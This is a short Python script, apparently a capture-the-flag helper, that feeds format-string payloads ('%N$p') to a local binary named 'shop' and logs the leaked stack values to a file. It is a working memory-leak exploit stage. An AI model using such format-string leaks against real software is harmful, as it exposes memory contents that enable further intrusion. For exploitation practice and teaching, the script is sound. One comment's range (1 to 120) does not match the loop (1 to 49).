#!/usr/bin/env python3

import subprocess
import re
from time import sleep

def leak_address(i):
    """Send format string to leak memory and return the result"""
    try:
        # Run the shop binary with pwntools-like interaction
        proc = subprocess.Popen(['./shop'], 
                               stdin=subprocess.PIPE, 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE,
                               text=True)
        
        # Wait for the username prompt
        sleep(0.1)
        
        # Send format string as username
        format_string = f"%{i}$p\n"
        proc.stdin.write(format_string)
        proc.stdin.flush()
        
        # Wait a bit for response
        sleep(0.1)
        
        # Send '5' to exit the program
        proc.stdin.write("5\n")
        proc.stdin.flush()
        
        # Get the output
        output, _ = proc.communicate(timeout=1)
        
        # Extract the leaked value after "Welcome, "
        match = re.search(r"Welcome, (.+?)\n", output)
        if match:
            return match.group(1)
        else:
            return "Not found"
            
    except subprocess.TimeoutExpired:
        proc.kill()
        return "Timeout"
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    print("Starting memory leak...")
    
    # Open output file
    with open("leak.txt", "w") as f:
        # Leak addresses from 1 to 120
        for i in range(1, 50):
            leaked = leak_address(i)
            
            # Write to file
            f.write(f"{i} = {leaked}\n")
            
            # Display progress
            print(f"Format string %{i}$p: {leaked}")
    
    print("Leak complete. Results saved to leak.txt")

if __name__ == "__main__":
    main()
